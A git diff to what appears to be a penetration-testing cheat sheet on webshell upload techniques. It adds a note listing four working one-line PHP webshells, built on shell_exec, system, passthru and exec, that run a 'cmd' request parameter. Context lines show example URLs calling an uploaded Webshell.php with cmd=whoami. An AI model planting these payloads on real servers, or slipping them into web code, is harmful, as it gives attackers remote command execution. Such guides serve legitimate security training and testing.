@@ -28,6 +28,7 @@ III. Usefull Github links for Webshells
 
 IV. Quickly set up a test environment using Docker
 ```
+
 ### I. Classic Webshell upload techniques
 #### Technique 1 - PHPMyAdmin Web console
 ```
@@ -52,6 +53,13 @@ IV. Quickly set up a test environment using Docker
            Examples:
            - http://x.x.x.x/<website-name>/wp-content/uploads/Webshell.php?cmd=whoami
            - http://x.x.x.x/<website-name>/Webshell.php?cmd=whoami
+
+Note: Several PHP functions can be used in a webshell to execute OS commands
+           Examples:
+           + shell_exec() function: <?php echo shell_exec($_GET['cmd']); ?>
+           + system() function: <?php system($_GET['cmd']); ?>
+           + passthru() function: <?php echo passthru($_GET['cmd']); ?>
+           + exec() function: <?php echo exec($_POST['cmd']); ?>
 ```
 
 #### Technique 2 - Apache Tomcat Manager Web console
